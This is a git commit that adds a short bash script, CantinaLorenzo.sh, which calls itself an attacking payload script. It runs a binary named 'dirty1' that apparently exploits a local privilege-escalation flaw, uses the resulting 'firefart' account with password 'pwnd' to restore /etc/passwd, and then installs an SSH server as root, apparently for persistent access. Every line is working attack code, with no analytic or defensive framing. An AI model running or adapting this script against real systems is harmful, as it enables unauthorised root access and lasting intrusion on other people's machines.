9cd5ed7bc3de0a1fadcbdb73fb82052d3b4a3710
Albert Stoker <24442730+AlbertStoker@users.noreply.github.com>
2019-03-18 10:58:32 +0000

    Update CantinaLorenzo.sh

--- CantinaLorenzo.sh
+++ CantinaLorenzo.sh
@@ -1,1 +1,7 @@
-
+#!/bin/bash
+#This is a payload script to automate the execution of the attacking payload and followup tasks. 
+cd /var/crash && 
+chmod +x dirty1 && 
+./dirty1 pwnd && 
+echo pwnd | su -c firefart mv /tmp/passwd.bak /etc/passwd && 
+su -c firefart apt-get install openssh-server
